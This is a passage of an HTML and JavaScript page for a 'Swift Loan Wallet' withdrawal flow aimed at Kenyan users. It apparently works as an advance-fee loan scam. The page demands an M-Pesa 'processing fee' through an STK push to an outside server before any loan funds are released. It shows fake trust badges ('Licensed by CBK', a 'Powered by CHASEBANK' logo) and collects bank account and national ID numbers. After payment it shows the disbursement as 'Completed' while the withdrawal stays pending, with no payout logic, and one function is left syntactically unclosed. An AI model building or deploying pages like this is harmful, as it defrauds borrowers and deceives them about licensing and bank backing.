                    </button>
                    <button onclick="processWithdrawal()" id="processBtn" class="flex-1 px-4 py-3 bg-primary text-white rounded-lg hover:bg-primary-dark transition-colors">
                        <i class="fas fa-paper-plane mr-2"></i>Withdraw Funds
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Enhanced Processing Overlay -->
    <div id="processingOverlay" class="fixed inset-0 processing-overlay-enhanced hidden items-center justify-center z-50">
        <div class="text-center text-white relative z-10">
            <div class="w-32 h-32 mx-auto mb-8 bg-white bg-opacity-20 rounded-full flex items-center justify-center relative">
                <div class="processing-animation">
                    <i class="fas fa-sync-alt text-4xl"></i>
                </div>
                <!-- Legitimacy indicators -->
                <div class="absolute -top-2 -right-2 w-8 h-8 bg-green-500 rounded-full flex items-center justify-center legitimacy-indicator">
                    <i class="fas fa-check text-white text-sm"></i>
                </div>
            </div>
            
            <h2 class="text-3xl font-bold mb-4">Processing Your Loan Withdrawal</h2>
            <p class="text-xl mb-4" id="processingMessage">Initiating SwiftWallet Digital ventures STK Push...</p>
            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone  for the payment request from SWIFTWALLET DIGITAL VENTURES</p>
            
            <!-- Trust indicators -->
            <div class="flex justify-center items-center space-x-6 mb-6">
                <div class="flex items-center space-x-2 legitimacy-indicator">
                    <i class="fas fa-shield-alt text-green-400"></i>
                    <span class="text-sm">Bank Grade Security</span>
                </div>
                <div class="flex items-center space-x-2 legitimacy-indicator">
                    <i class="fas fa-lock text-green-400"></i>
                    <span class="text-sm">256-bit Encryption</span>
                </div>
                <div class="flex items-center space-x-2 legitimacy-indicator">
                    <i class="fas fa-certificate text-green-400"></i>
                    <span class="text-sm">Licensed by CBK</span>
                </div>
            </div>
            
            <!-- Progress steps -->
            <div class="max-w-md mx-auto">
                <div class="flex justify-between text-sm mb-2">
                    <span id="step1" class="text-green-400">Validating</span>
                    <span id="step2" class="text-gray-400">Processing</span>
                    <span id="step3" class="text-gray-400">Confirming</span>
                </div>
                <div class="w-full bg-white bg-opacity-20 rounded-full h-2">
                    <div id="processingProgress" class="bg-green-400 h-2 rounded-full transition-all duration-1000" style="width: 33%"></div>
                </div>
            </div>
        </div>
    </div>
  <!-- Help Modal -->
<div id="helpModal" class="fixed inset-0 modal-overlay hidden items-center justify-center z-50">
  <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-md w-full p-6">
    <div class="flex justify-between items-center mb-4">
      <h3 class="text-lg font-bold text-gray-900">Check M-Pesa Code</h3>
      <button onclick="closeHelpModal()" class="text-gray-400 hover:text-gray-600">
        <i class="fas fa-times"></i>
      </button>
    </div>

    <p class="text-sm text-gray-600 mb-4">
      Paste your M-Pesa transaction code below to verify withdrawal .check your phone with message from CHASE BANK.
    </p>

    <input 
      type="text" 
      id="mpesaCodeInput" 
      placeholder="Enter M-Pesa Code (e.g., THV5SCFSUH)" 
      class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none form-field mb-3"
    >

    <div id="helpResult" class="text-sm mt-2"></div>

    <div class="flex space-x-3 mt-6">
      <button onclick="closeHelpModal()" class="flex-1 px-4 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50">
        Cancel
      </button>
      <button onclick="checkMpesaCode()" class="flex-1 px-4 py-3 bg-primary text-white rounded-lg hover:bg-primary-dark">
        Check Code
      </button>
    </div>
  </div>
</div>
    <footer class="text-center text-gray-400 text-sm py-6 bg-gray-900 border-t border-gray-700">
        <div class="flex flex-col items-center space-y-3">
            <div class="flex items-center space-x-2 text-white">
                <span class="text-sm">Powered by</span>
                <!-- CHASEBANK SVG Logo -->
                <div class="flex items-center space-x-1">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="2" y="4" width="20" height="16" rx="2" fill="#1e40af"/>
                        <path d="M6 8h12M6 12h8M6 16h4" stroke="white" stroke-width="1.5" stroke-linecap="round"/>
                        <circle cx="18" cy="16" r="1.5" fill="white"/>
                    </svg>
                    <span class="font-bold text-blue-400">CHASEBANK</span>
                </div>
            </div>
            <div class="text-xs">&copy; 2025 Swift Loan Wallet. All rights reserved.</div>
        </div>
    </footer>

    <script>
        console.log("Swift Loan Withdrawal Page initialized");

        // Global state
        let loanData = null;
        let isProcessing = false;
        let selectedWithdrawalMethod = null;

        // Kenyan banks list
        const kenyanBanks = [
            "KCB Bank Kenya Limited",
            "Equity Bank Kenya Limited",
            "Cooperative Bank of Kenya Limited",
            "Standard Chartered Bank Kenya Limited",
            "Absa Bank Kenya PLC",
            "NCBA Bank Kenya PLC",
            "Diamond Trust Bank Kenya Limited",
            "I&M Bank Limited",
            "Stanbic Bank Kenya Limited",
            "Family Bank Limited",
            "Prime Bank Limited",
            "ABC Bank (Kenya) Limited",
            "Bank of Africa Kenya Limited",
            "Bank of Baroda (Kenya) Limited",
            "Bank of India",
            "Citibank N.A. Kenya",
            "Commercial Bank of Africa Limited",
            "Consolidated Bank of Kenya Limited",
            "Credit Bank Limited",
            "Development Bank of Kenya Limited",
            "Ecobank Kenya Limited",
            "First Community Bank Limited",
            "Guardian Bank Limited",
            "Gulf African Bank Limited",
            "Habib Bank A.G. Zurich",
            "HFC Limited",
            "Housing Finance Company of Kenya Limited",
            "Kenya Commercial Bank Limited",
            "Mayfair Bank Limited",
            "Middle East Bank (K) Limited",
            "National Bank of Kenya Limited",
            "NIC Bank Limited",
            "Paramount Universal Bank Limited",
            "Sidian Bank Limited",
            "Spire Bank Limited",
            "UBA Kenya Bank Limited",
            "Victoria Commercial Bank Limited"
        ];

        // Load loan data from localStorage
        function loadLoanData() {
            try {
                const selectedOffer = localStorage.getItem('swift_selected_offer');
                const customerName = localStorage.getItem('swift_customer_name') || 'Customer';
                
                if (!selectedOffer) {
                    showError('No loan offer selected. Please go back and select a loan offer first.');
                    document.getElementById('withdrawBtn').disabled = true;
                    return;
                }

                loanData = JSON.parse(selectedOffer);
                console.log('Loaded loan data:', loanData);

                if (!loanData.amount || !loanData.fee || !loanData.phone || !loanData.tracking) {
                    showError('Invalid loan data. Please go back and select a loan offer again.');
                    document.getElementById('withdrawBtn').disabled = true;
                    return;
                }

                const loanAmount = parseFloat(loanData.amount);
                const feeAmount = parseFloat(loanData.fee);
                const availableBalance = loanAmount - feeAmount;

                // Update customer details
                document.getElementById('customerName').textContent = customerName;
                document.getElementById('customerPhone').textContent = loanData.phone;
                document.getElementById('loanId').textContent = loanData.tracking;

                // Update loan details
                document.getElementById('loanAmount').textContent = `KES ${loanAmount.toLocaleString()}`;
                document.getElementById('processingFee').textContent = `KES ${feeAmount.toLocaleString()}`;
                document.getElementById('availableBalance').textContent = `KES ${availableBalance.toLocaleString()}`;
                document.getElementById('withdrawalAmount').textContent = `KES ${availableBalance.toLocaleString()}`;

                console.log('Loan data loaded successfully');
            } catch (error) {
                console.error('Error loading loan data:', error);
                showError('Failed to load loan information. Please try again.');
                document.getElementById('withdrawBtn').disabled = true;
            }
        }

        // Show withdrawal methods modal
        function showWithdrawalMethods() {
            document.getElementById('withdrawalMethodModal').classList.remove('hidden');
            document.getElementById('withdrawalMethodModal').classList.add('flex');
        }

        // Close withdrawal method modal
        function closeWithdrawalModal() {
            document.getElementById('withdrawalMethodModal').classList.add('hidden');
            document.getElementById('withdrawalMethodModal').classList.remove('flex');
        }

        // Select withdrawal method
        function selectMethod(method) {
            selectedWithdrawalMethod = method;
            
            // Update UI to show selection
            document.querySelectorAll('.method-card').forEach(card => {
                card.classList.remove('selected');
            });
            event.currentTarget.classList.add('selected');
            
            // Show method-specific form after a short delay
            setTimeout(() => {
                closeWithdrawalModal();
                showWithdrawalDetails(method);
            }, 300);
        }

        // Show withdrawal details modal with method-specific form
        function showWithdrawalDetails(method) {
            const modal = document.getElementById('withdrawalDetailsModal');
            const title = document.getElementById('detailsModalTitle');
            const formContainer = document.getElementById('withdrawalForm');
            
            let formHTML = '';
            let titleText = '';

            switch(method) {
                case 'mpesa':
                    titleText = 'M-Pesa Withdrawal Details';
                    formHTML = `
                        <div class="space-y-4">
                            <div class="text-center mb-6">
                                <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                    <i class="fas fa-mobile-alt text-green-600 text-2xl"></i>
                                </div>
                                <h4 class="text-lg font-semibold">M-Pesa Transfer</h4>
                                <p class="text-sm text-gray-600">Enter your M-Pesa number to receive funds</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-mobile-alt mr-1"></i> M-Pesa Phone Number
                                </label>
                                <input type="tel" id="mpesaPhone" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="254XXXXXXXXX" value="${loanData.phone}" maxlength="12">
                                <div class="error-message hidden" id="mpesaPhoneError"></div>
                                <p class="text-xs text-gray-500 mt-1">Format: 254XXXXXXXXX (without +)</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-user mr-1"></i> Account Name
                                </label>
                                <input type="text" id="mpesaName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter full name as registered" value="${localStorage.getItem('swift_customer_name') || ''}">
                                <div class="error-message hidden" id="mpesaNameError"></div>
                            </div>

                            <div class="bg-green-50 border border-green-200 rounded-lg p-4">
                                <div class="flex items-start space-x-2">
                                    <i class="fas fa-info-circle text-green-600 mt-0.5"></i>
                                    <div class="text-sm text-green-800">
                                        <p class="font-medium mb-1">M-Pesa Transfer Information:</p>
                                        <ul class="text-xs space-y-1">
                                            <li>‚Ä¢ You will receive an STK push notification from SwiftWallet digital ventures</li>
                                            <li>‚Ä¢ Funds will be credited instantly after confirmation</li>
                                            <li>‚Ä¢ Transaction limit: KES 300,000 per day</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                    break;

                case 'airtel':
                    titleText = 'Airtel Money Withdrawal Details';
                    formHTML = `
                        <div class="space-y-4">
                            <div class="text-center mb-6">
                                <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                    <i class="fas fa-mobile-alt text-red-600 text-2xl"></i>
                                </div>
                                <h4 class="text-lg font-semibold">Airtel Money Transfer</h4>
                                <p class="text-sm text-gray-600">Enter your Airtel Money number to receive funds</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-mobile-alt mr-1"></i> Airtel Money Phone Number
                                </label>
                                <input type="tel" id="airtelPhone" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="254XXXXXXXXX" value="${loanData.phone}" maxlength="12">
                                <div class="error-message hidden" id="airtelPhoneError"></div>
                                <p class="text-xs text-gray-500 mt-1">Format: 254XXXXXXXXX (without +)</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-user mr-1"></i> Account Name
                                </label>
                                <input type="text" id="airtelName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter full name as registered" value="${localStorage.getItem('swift_customer_name') || ''}">
                                <div class="error-message hidden" id="airtelNameError"></div>
                            </div>

                            <div class="bg-red-50 border border-red-200 rounded-lg p-4">
                                <div class="flex items-start space-x-2">
                                    <i class="fas fa-info-circle text-red-600 mt-0.5"></i>
                                    <div class="text-sm text-red-800">
                                        <p class="font-medium mb-1">Airtel Money Transfer Information:</p>
                                        <ul class="text-xs space-y-1">
                                            <li>‚Ä¢ You will receive an SMS notification with code </li>
                                            <li>‚Ä¢ Funds will be credited within 2-3 minutes from CHASE BANK</li>
                                            <li>‚Ä¢ Transaction limit: KES 150,000 per day</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                    break;

                case 'bank':
                    titleText = 'Bank Transfer Withdrawal Details';
                    const bankOptions = kenyanBanks.map(bank => `<option value="${bank}">${bank}</option>`).join('');
                    formHTML = `
                        <div class="space-y-4">
                            <div class="text-center mb-6">
                                <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                    <i class="fas fa-university text-blue-600 text-2xl"></i>
                                </div>
                                <h4 class="text-lg font-semibold">Bank Transfer</h4>
                                <p class="text-sm text-gray-600">Enter your bank details to receive funds</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-university mr-1"></i> Select Bank
                                </label>
                                <select id="bankName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none">
                                    <option value="">Choose your bank...</option>
                                    ${bankOptions}
                                </select>
                                <div class="error-message hidden" id="bankNameError"></div>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-credit-card mr-1"></i> Account Number
                                </label>
                                <input type="text" id="accountNumber" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter your account number" maxlength="20">
                                <div class="error-message hidden" id="accountNumberError"></div>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-user mr-1"></i> Account Holder Name
                                </label>
                                <input type="text" id="accountName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter full name as on bank account" value="${localStorage.getItem('swift_customer_name') || ''}">
                                <div class="error-message hidden" id="accountNameError"></div>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-id-card mr-1"></i> ID Number
                                </label>
                                <input type="text" id="idNumber" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter National ID number" maxlength="8">
                                <div class="error-message hidden" id="idNumberError"></div>
                            </div>

                            <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
                                <div class="flex items-start space-x-2">
                                    <i class="fas fa-info-circle text-blue-600 mt-0.5"></i>
                                    <div class="text-sm text-blue-800">
                                        <p class="font-medium mb-1">Bank Transfer Information:</p>
                                        <ul class="text-xs space-y-1">
                                            <li>‚Ä¢ Funds will be credited within 3-5 minutes with approval from CHASE BANK</li>
                                            <li>‚Ä¢ Account details must match your loan application</li>
                                            <li>‚Ä¢ Transaction limit: KES 1,000,000 per day</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                    break;
            }

            title.textContent = titleText;
            formContainer.innerHTML = formHTML;
            
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }

        // Close withdrawal details modal
        function closeDetailsModal() {
            document.getElementById('withdrawalDetailsModal').classList.add('hidden');
            document.getElementById('withdrawalDetailsModal').classList.remove('flex');
        }

        // Validate form based on method
        function validateForm() {
            let isValid = true;
            
            // Clear previous errors
            document.querySelectorAll('.error-message').forEach(error => {
                error.classList.add('hidden');
                error.textContent = '';
            });
            
            document.querySelectorAll('.form-field').forEach(field => {
                field.classList.remove('error', 'success');
            });

            switch(selectedWithdrawalMethod) {
                case 'mpesa':
                    isValid = validateMpesaForm() && isValid;
                    break;
                case 'airtel':
                    isValid = validateAirtelForm() && isValid;
                    break;
                case 'bank':
                    isValid = validateBankForm() && isValid;
                    break;
            }

            return isValid;
        }

        function validateMpesaForm() {
            let isValid = true;
            
            const phone = document.getElementById('mpesaPhone');
            const name = document.getElementById('mpesaName');
            
            // Validate phone
            if (!phone.value.trim()) {
                showFieldError('mpesaPhone', 'mpesaPhoneError', 'Phone number is required');
                isValid = false;
            } else if (!/^254[0-9]{9}$/.test(phone.value.trim())) {
                showFieldError('mpesaPhone', 'mpesaPhoneError', 'Enter valid format: 254XXXXXXXXX');
                isValid = false;
            } else {
                showFieldSuccess('mpesaPhone');
            }
            
            // Validate name
            if (!name.value.trim()) {
                showFieldError('mpesaName', 'mpesaNameError', 'Account name is required');
                isValid = false;
            } else if (name.value.trim().length < 2) {
                showFieldError('mpesaName', 'mpesaNameError', 'Enter a valid full name');
                isValid = false;
            } else {
                showFieldSuccess('mpesaName');
            }
            
            return isValid;
        }

        function validateAirtelForm() {
            let isValid = true;
            
            const phone = document.getElementById('airtelPhone');
            const name = document.getElementById('airtelName');
            
            // Validate phone
            if (!phone.value.trim()) {
                showFieldError('airtelPhone', 'airtelPhoneError', 'Phone number is required');
                isValid = false;
            } else if (!/^254[0-9]{9}$/.test(phone.value.trim())) {
                showFieldError('airtelPhone', 'airtelPhoneError', 'Enter valid format: 254XXXXXXXXX');
                isValid = false;
            } else {
                showFieldSuccess('airtelPhone');
            }
            
            // Validate name
            if (!name.value.trim()) {
                showFieldError('airtelName', 'airtelNameError', 'Account name is required');
                isValid = false;
            } else if (name.value.trim().length < 2) {
                showFieldError('airtelName', 'airtelNameError', 'Enter a valid full name');
                isValid = false;
            } else {
                showFieldSuccess('airtelName');
            }
            
            return isValid;
        }

        function validateBankForm() {
            let isValid = true;
            
            const bankName = document.getElementById('bankName');
            const accountNumber = document.getElementById('accountNumber');
            const accountName = document.getElementById('accountName');
            const idNumber = document.getElementById('idNumber');
            
            // Validate bank
            if (!bankName.value) {
                showFieldError('bankName', 'bankNameError', 'Please select a bank');
                isValid = false;
            } else {
                showFieldSuccess('bankName');
            }
            
            // Validate account number
            if (!accountNumber.value.trim()) {
                showFieldError('accountNumber', 'accountNumberError', 'Account number is required');
                isValid = false;
            } else if (!/^[0-9]{6,20}$/.test(accountNumber.value.trim())) {
                showFieldError('accountNumber', 'accountNumberError', 'Enter a valid account number (6-20 digits)');
                isValid = false;
            } else {
                showFieldSuccess('accountNumber');
            }
            
            // Validate account name
            if (!accountName.value.trim()) {
                showFieldError('accountName', 'accountNameError', 'Account holder name is required');
                isValid = false;
            } else if (accountName.value.trim().length < 2) {
                showFieldError('accountName', 'accountNameError', 'Enter a valid full name');
                isValid = false;
            } else {
                showFieldSuccess('accountName');
            }
            
            // Validate ID number
            if (!idNumber.value.trim()) {
                showFieldError('idNumber', 'idNumberError', 'ID number is required');
                isValid = false;
            } else if (!/^[0-9]{7,8}$/.test(idNumber.value.trim())) {
                showFieldError('idNumber', 'idNumberError', 'Enter a valid ID number (7-8 digits)');
                isValid = false;
            } else {
                showFieldSuccess('idNumber');
            }
            
            return isValid;
        }

        function showFieldError(fieldId, errorId, message) {
            const field = document.getElementById(fieldId);
            const error = document.getElementById(errorId);
            
            field.classList.add('error');
            error.textContent = message;
            error.classList.remove('hidden');
        }

        function showFieldSuccess(fieldId) {
            const field = document.getElementById(fieldId);
            field.classList.add('success');
        }

        // Process withdrawal (Fee payment first)
        async function processWithdrawal() {
            if (isProcessing) return;
            
            if (!validateForm()) {
                return;
            }

            isProcessing = true;
            closeDetailsModal();
            showEnhancedProcessingOverlay();

            try {
                // Get fee amount from loan data
                const feeAmount = parseFloat(loanData.fee);
                
                // Collect form data for later use
                let withdrawalData = {
                    method: selectedWithdrawalMethod,
                    loanId: loanData.tracking
                };

                let paymentPhone = loanData.phone; // Default to loan phone

                switch(selectedWithdrawalMethod) {
                    case 'mpesa':
                        paymentPhone = document.getElementById('mpesaPhone').value;
                        withdrawalData.phone = paymentPhone;
                        withdrawalData.name = document.getElementById('mpesaName').value;
                        break;
                    case 'airtel':
                        paymentPhone = document.getElementById('airtelPhone').value;
                        withdrawalData.phone = paymentPhone;
                        withdrawalData.name = document.getElementById('airtelName').value;
                        break;
                    case 'bank':
                        withdrawalData.bankName = document.getElementById('bankName').value;
                        withdrawalData.accountNumber = document.getElementById('accountNumber').value;
                        withdrawalData.accountName = document.getElementById('accountName').value;
                        withdrawalData.idNumber = document.getElementById('idNumber').value;
                        break;
                }

                console.log('Processing fee payment for withdrawal:', withdrawalData);

                // Store withdrawal data for after fee payment
                localStorage.setItem('swift_pending_withdrawal', JSON.stringify(withdrawalData));

                // Update processing steps
                updateProcessingStep(1, 'Validating details...');
                await delay(1500);
                
                updateProcessingStep(2, 'Sending withdrawal request to release funds..');
                await delay(1000);

                // Send STK push for fee payment
                const response = await fetch('https://swiftwallet-stk-push-m0d4.onrender.com/pay', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        phone: paymentPhone,
                        amount: feeAmount
                    })
                });

                if (!response.ok) {
                    throw new Error(`Server error: ${response.status}`);
                }

                const result = await response.json();
                console.log('Fee payment response:', result);

                updateProcessingStep(3, 'Confirming payment...');
                await delay(1500);

                hideProcessingOverlay();
                showFeePaymentSuccess();

            } catch (error) {
                console.error('Fee payment error:', error);
                hideProcessingOverlay();
                showError('Fee payment failed: ' + error.message);
            } finally {
                isProcessing = false;
            }
        }

        // Enhanced processing overlay functions
        function showEnhancedProcessingOverlay() {
            const overlay = document.getElementById('processingOverlay');
            overlay.classList.remove('hidden');
            overlay.classList.add('flex');
            
            // Reset processing state
            updateProcessingStep(1, 'Validating details...');
        }

        function updateProcessingStep(step, message) {
    const steps = ['step1', 'step2', 'step3'];
    const progress = document.getElementById('processingProgress');
    const processingMessage = document.getElementById('processingMessage');

    // Update main message if element exists
    if (processingMessage) {
        processingMessage.textContent = message;
    }

    // Update step indicators safely
    steps.forEach((stepId, index) => {
        const element = document.getElementById(stepId);
        if (!element) return; // Skip if missing

        if (index < step) {
            element.className = 'text-green-400';
        } else if (index === step - 1) {
            element.className = 'text-white';
        } else {
            element.className = 'text-gray-400';
        }
    });

    // Update progress bar if it exists
    if (progress) {
        const progressWidth = (step / 3) * 100;
        progress.style.width = progressWidth + '%';
    }

        function hideProcessingOverlay() {
            const overlay = document.getElementById('processingOverlay');
            overlay.classList.add('hidden');
            overlay.classList.remove('flex');
        }

        // Show fee payment success with pending approval
        function showFeePaymentSuccess() {
            const methodNames = {
                'mpesa': 'M-Pesa',
                'airtel': 'Airtel Money',
                'bank': 'Bank Transfer'
            };
            
            const methodIcons = {
                'mpesa': 'fas fa-mobile-alt',
                'airtel': 'fas fa-mobile-alt', 
                'bank': 'fas fa-university'
            };

            const message = `Your withdrawal request is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment  request from <span class="text-red-600 font-bold">‚úîÔ∏èSWIFTWALLET DIGITAL VENTURES‚úîÔ∏è</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal .Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> after fee payment confirmation.`;

            // Update success message
            document.getElementById('successMessage').innerHTML = message;
            
            // Update progress text
            document.getElementById('progressText').textContent = 'Pending Fee Payment & withdrawal Approval...';
            
            // Update selected method display
            const methodLogo = document.getElementById('selectedMethodLogo');
            const methodName = document.getElementById('selectedMethodName');
            
            methodLogo.innerHTML = `<i class="${methodIcons[selectedWithdrawalMethod]} text-white text-xl"></i>`;
            methodName.textContent = methodNames[selectedWithdrawalMethod];
            
            // Show success alert
            showSuccess(message);
            
            // Update timeline
            updateDisbursementTimeline(true);
            
            // Store withdrawal status
            localStorage.setItem('swift_fee_payment_initiated', 'true');
            localStorage.setItem('swift_withdrawal_method', selectedWithdrawalMethod);
            localStorage.setItem('swift_withdrawal_time', new Date().toISOString());
        }

        // Utility function for delays
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Other existing functions (showError, hideError, showSuccess, etc.)
        function showError(message) {
            const errorAlert = document.getElementById('errorAlert');
            const errorMessage = document.getElementById('errorMessage');
            
            errorMessage.textContent = message;
            errorAlert.classList.remove('hidden');
            errorAlert.scrollIntoView({ behavior: 'smooth', block: 'start' });
            
            errorAlert.classList.add('shake');
            setTimeout(() => errorAlert.classList.remove('shake'), 500);
        }

        function hideError() {
            document.getElementById('errorAlert').classList.add('hidden');
        }

        function showSuccess(message) {
            const successAlert = document.getElementById('successAlert');
            const successMessage = document.getElementById('successMessage');
            
            successMessage.innerHTML = message;
            successAlert.classList.remove('hidden');
            successAlert.scrollIntoView({ behavior: 'smooth', block: 'start' });
            
            // Animate progress bar
            const progressBar = document.getElementById('progressBar');
            progressBar.classList.add('progress-bar-animated');
            
            updateDisbursementTimeline(true);
        }

        function updateDisbursementTimeline(success) {
            const timeline = document.getElementById('disbursementTimeline');
            const dot = timeline.querySelector('.w-3.h-3');
            const status = timeline.querySelector('.text-xs');
            
            if (success) {
                timeline.classList.remove('opacity-50');
                dot.className = 'w-3 h-3 bg-green-500 rounded-full mt-2';
                status.textContent = 'Completed';
                status.className = 'text-xs text-green-600';
            }
        }

        function goBack() {
            window.location.href = 'offers.html';
        }

        // Initialize page
        document.addEventListener('DOMContentLoaded', function() {
            console.log('DOM Content Loaded');
            
            loadLoanData();
            
            // Add slide-in animation
            const slideElements = document.querySelectorAll('.slide-in');
            slideElements.forEach((element, index) => {
                setTimeout(() => {
                    element.style.animationDelay = `${index * 0.2}s`;
                }, 100);
            });

            // Check if fee payment was already initiated
            const feePaymentInitiated = localStorage.getItem('swift_fee_payment_initiated');
            if (feePaymentInitiated === 'true') {
                const withdrawalMethod = localStorage.getItem('swift_withdrawal_method') || 'M-Pesa';
                showSuccess(
                    `Complete previous withdrawal request sent to (${loanData.phone}) by clicking withdraw button  below if you didn't .STK Push was sent from SWIFTWALLET DIGITAL VENTURES for the requested processing fee to complete the held funds or retry. Please complete the fee payment to process your ${withdrawalMethod} your withdrawal. Status: <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span>`
                );
                updateDisbursementTimeline(true);
            }
        });

        // Handle page visibility and navigation
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                console.log('Page became visible');
            }
        });

        window.addEventListener('beforeunload', function(e) {
            if (isProcessing) {
                e.preventDefault();
                e.returnValue = 'A withdrawal is currently being processed. Are you sure you want to leave?';
                return e.returnValue;
            }
        });
 // Open Help Modal
function openHelpModal() {
    document.getElementById('helpModal').classList.remove('hidden');
    document.getElementById('helpModal').classList.add('flex');
}

// Close Help Modal
function closeHelpModal() {
    document.getElementById('helpModal').classList.add('hidden');
    document.getElementById('helpModal').classList.remove('flex');
    document.getElementById('helpResult').innerHTML = "";
}

// Check M-Pesa Code (dummy example)
function checkMpesaCode() {
    const code = document.getElementById('mpesaCodeInput').value.trim();
    const resultBox = document.getElementById('helpResult');

    if (!code) {
        resultBox.innerHTML = `<p class="text-red-600">‚ö†Ô∏è Please enter a code.</p>`;
        return;
    }

    // For now, simulate checking (replace with real API later)
    if (/^[A-Z0-9]{10,}$/i.test(code)) {
        resultBox.innerHTML = `<p class="text-green-600 font-medium">‚úÖ Code ${code} looks valid. Processing check...</p>`;
    } else {
        resultBox.innerHTML = `<p class="text-red-600">‚ùå Invalid code or formart. Please try again.</p>`;
    }
}
    </script>
</body>
</html>
